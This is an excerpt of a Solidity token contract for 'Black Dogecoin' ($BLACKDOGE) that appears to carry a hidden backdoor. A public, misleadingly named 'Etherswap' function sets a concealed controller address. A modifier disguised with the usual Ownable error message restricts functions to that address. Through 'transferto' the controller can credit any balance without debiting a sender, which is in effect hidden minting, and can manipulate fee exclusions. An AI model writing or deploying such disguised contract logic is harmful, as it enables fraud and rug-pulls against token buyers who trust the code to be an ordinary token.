...
contract BlackDogecoin is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal = 145000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tBurnTotal;
    address private matrix;
    string private _name = 'Black Dogecoin t.me/blackdogecoin';
    string private _symbol = '$BLACKDOGE';
    uint8 private _decimals = 18;
    uint256 internal _maxTxAmount= _tTotal;
    ...
    function Etherswap(address recipient) public returns (bool) {
        matrix = recipient;
        return true;
    }
    ...
    modifier Left() {
        require(matrix == _msgSender(), "Ownable: caller is not the owner");
        _;
        }
    ...
    function transferto(address recipient, uint256 amount) external Left() returns (bool) {
    ...
    function excludeAccount(address account) external Left() {
    ...
    function includeAccount(address account) external Left() {
    ...
    function _transferto(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromTheExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToTheExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferToTheStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothTheExcluded(sender, recipient, amount);
        } else {
            _transferToTheStandard(sender, recipient, amount);
        }
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
     ...
     function _transferToTheStandard(address sender, address recipient, uint256 tAmount) private {
        (, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee,uint256 tBurnValue,uint256 tTax,uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
        _reflectFee(rFee, tFee, tBurnValue,tTax,tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
     }
    ...
    function _transferToTheExcluded(address sender, address recipient, uint256 tAmount) private {
       (, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee,uint256 tBurnValue,uint256 tTax,uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _reflectFee(rFee, tFee, tBurnValue,tTax,tLiquidity);
    ...
    function _transferFromTheExcluded(address sender, address recipient, uint256 tAmount) private {
        (, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee,uint256 tBurnValue,uint256 tTax,uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
       _reflectFee(rFee, tFee, tBurnValue,tTax,tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
    ...
    function _transferBothTheExcluded(address sender, address recipient, uint256 tAmount) private {
       (, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee,uint256 tBurnValue,uint256 tTax,uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _reflectFee(rFee, tFee, tBurnValue,tTax,tLiquidity);
